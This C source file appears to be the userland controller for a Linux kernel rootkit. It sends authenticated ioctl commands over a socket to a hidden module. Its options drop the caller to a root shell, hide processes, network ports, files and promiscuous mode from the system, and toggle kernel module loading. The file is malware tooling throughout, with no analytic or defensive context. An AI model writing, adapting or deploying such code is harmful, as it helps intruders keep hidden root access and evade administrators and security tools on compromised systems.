#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>

#define AUTH_TOKEN 0x12345678

#define SHELL "/bin/sh" // Linux

// struct rk_proc_args
// {
//     unsigned short pid;
// };

// struct rk_port_args
// {
//     unsigned short port;
// };

// struct rk_file_args
// {
//     char *name;
//     unsigned short namelen;
// };

// struct rk_args
// {
//     unsigned short cmd;
//     void *ptr;
// };

struct rk_args
{
    unsigned short cmd;
    union
    {
        unsigned short num;
        unsigned short pid;
        unsigned short port;
        unsigned short namelen;
    };
    char *name;
};

int main(int argc, char *argv[])
{
    struct rk_args rk_args;
    // struct rk_proc_args rk_proc_args;
    // struct rk_port_args rk_port_args;
    // struct rk_file_args rk_file_args;
    int sockfd;
    int io;
    unsigned short cmd;
    unsigned short num;

    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    if (sockfd < 0)
    {
        perror("socket");
        exit(1);
    }

    cmd = atoi(argv[1]);
    rk_args.cmd = cmd;

    switch (cmd)
    {
    case 0:
        printf("Dropping to root shell\n");
        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
        execl(SHELL, "zsh", NULL);
        break;

    case 1: // Hide Proc
    case 2: // Unhide Proc
    {
        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding PID %hu\n", pid);

        rk_args.pid = pid;

        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
    }
    break;

    case 3:  // Hide tcp 4 port
    case 4:  // Unide tcp 4 port
    case 5:  // Hide tcp 6 port
    case 6:  // Unide tcp 6 port
    case 7:  // Hide udp 4 port
    case 8:  // Unide udp 4 port
    case 9:  // Hide udp 6 port
    case 10: // Unide udp 6 port
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding/Unhiding port %hu\n", port);

        rk_args.port = port;

        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
    }
    break;

    case 11: // Hide file
    case 12: // Unhide file
    {
        printf("Hiding/Unhiding file %s\n", argv[2]);
        rk_args.name = argv[2];
        rk_args.namelen = strlen(argv[2]);
    }
    case 13: // Hide PROMISC
    case 14: // Unhide PROMISC
    case 15: // Enable module loading
    case 16: // Prohibit module loading
    case 17: // Re-permit module loading
        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
        break;

    default:
    {
        struct ifconf ifc;
        printf("No action\n");
        io = ioctl(sockfd, SIOCGIFCONF, &ifc);
    }
    break;
    }

    if (io < 0)
    {
        perror("ioctl");
        exit(1);
    }

    return 0;
}
